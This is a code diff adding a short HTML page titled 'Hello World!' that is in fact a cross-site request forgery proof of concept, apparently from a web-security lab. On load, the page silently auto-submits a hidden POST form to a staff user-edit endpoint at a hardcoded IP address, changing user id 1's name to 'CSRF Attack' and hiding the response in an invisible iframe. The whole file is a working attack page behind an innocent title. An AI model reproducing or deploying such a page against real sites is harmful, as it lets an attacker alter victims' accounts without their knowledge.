@@ -1,0 +1,13 @@
+<html>
+	<head>
+		<title> Hello World! </title>
+	</head>
+	<body onload="document.forms[0].submit()">
+		<form id="form" target="res" action="https://35.225.125.173/red/public/staff/users/edit.php?id=1" method="post">
+			<input type="hidden" name="first_name" value="CSRF">
+			<input type="hidden" name="last_name" value="Attack">
+		</form>
+		<iframe name="res" style="display: none;"></iframe>
+	</body>
+</html>
+
